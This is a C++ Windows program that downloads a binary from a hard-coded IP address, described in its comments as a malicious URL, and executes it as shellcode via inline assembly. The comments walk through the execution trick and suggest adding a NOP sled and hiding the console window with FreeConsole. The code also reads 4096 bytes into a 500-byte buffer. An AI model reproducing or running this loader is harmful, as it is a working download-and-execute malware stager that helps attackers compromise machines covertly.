//include library wininet this have a funtions InternetOpen(),InternetOpenUrl(),InternetReadFile(),InternetCloseHandle(),
#include <windows.h>
#include<iostream>
#include<cstring>
#include<Wininet.h>
using namespace std;
//this is a buffer with shellcode data in .bss section
unsigned char DataReceived[500];
int main(){
    int i;
    //this configure a HTTP agent to surf
  HINTERNET connect = InternetOpen("MyBrowser",INTERNET_OPEN_TYPE_PRECONFIG,NULL, NULL, 0);
    //if for validate connection.
   if(!connect){
      cout<<"Connection Failed or Syntax error";
      return 0;
   }
 //Open a malicious url
HINTERNET OpenAddress = InternetOpenUrl(connect,"http://192.168.16.2/ascii.bin", NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE|INTERNET_FLAG_KEEP_CONNECTION, 0);
  
 //this check the handler for URL
   if ( !OpenAddress )
   {
      DWORD ErrorNum = GetLastError();
      cout<<"Failed to open URL \nError No: "<<ErrorNum;
      InternetCloseHandle(connect);
      return 0;
   }
  
  
   DWORD NumberOfBytesRead = 0;
    
   //this recovery a file on server and save data into DataReceived
   while(InternetReadFile(OpenAddress, DataReceived, 4096, &NumberOfBytesRead) && NumberOfBytesRead )
   {
   //this print the data in format \x00 you can delete this routine
   for(i=0;i<sizeof DataReceived; i++ ){
                    
                   printf("\\x%02x",DataReceived[i]);
                      
                    }
   /*this routine is a other implementattion of shellcode-test but in this routine i use  __asm () directive for call asm intrucctions.
   1)first i store a pointer to buffer in EAX register
   2)push eax, Pointer to DataReceived in stack now esp point to first 4 bytes of shellcode
   3)the ret instruction put the value of esp+4 into eip and pass the execution.
   4)finally the shellcode in DataReceived is executed
   5)all handler is closed.
   NOTA:
        you can put a nopsled before shellcode for estabilish execution .
        use freeconsole for hidden a Dos Windows
   */
__asm ("lea _DataReceived, %eax");
__asm ("push %eax");
__asm ("ret");
   }
  
   InternetCloseHandle(OpenAddress);
   InternetCloseHandle(connect);
  
   return 0;
}